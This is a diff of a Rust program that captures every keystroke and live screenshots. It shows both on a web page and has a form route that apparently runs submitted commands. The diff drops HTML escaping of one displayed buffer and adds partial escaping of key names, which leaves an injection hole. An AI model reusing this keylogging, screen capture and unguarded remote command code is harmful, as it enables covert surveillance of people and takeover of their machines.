@@ -16,7 +16,6 @@ use std::{
 };
 use tokio::{main, net::TcpListener, process::Command, spawn};
 use xcap::{Monitor, image::ImageFormat};
-use html_escape::encode_text;
 #[derive(Deserialize)]
 struct Frm {
     area: String,
@@ -43,7 +42,11 @@ async fn main() {
             let l = lckin.clone();
             listen(move |e| {
                 if let Some(name) = e.name {
-                    *l.lock().unwrap() += &name;
+                    *l.lock().unwrap() += match &name[..] {
+                        "&" => "&amp;",
+                        "<" => "&lt;",
+                        _others => _others,
+                    };
                 }
             })
             .unwrap();
@@ -66,7 +69,7 @@ async fn main() {
         }, Html(
             String::from(
                 r#"<!DOCTYPE html><html><body><form action="/cmd"method="post"><textarea name="area"></textarea><input type="submit"value="提交"/></form><a href="/clear">清空</a><pre style="white-space:pre-wrap;">"#,
-            ) + lock1.lock().unwrap().as_str() + "<hr>" + &*encode_text(lck1.lock().unwrap().as_str())
+            ) + lock1.lock().unwrap().as_str() + "<hr>" + lck1.lock().unwrap().as_str()
                 + r#"</pre><img src="screen.bmp"/><script>setInterval(()=>{document.querySelector("img").src="/screen.bmp?"+Date.now()},160);</script></body></html>"#,
         )).into_response()
     })) .route("/cmd", post(async |Form(Frm { mut area })| {
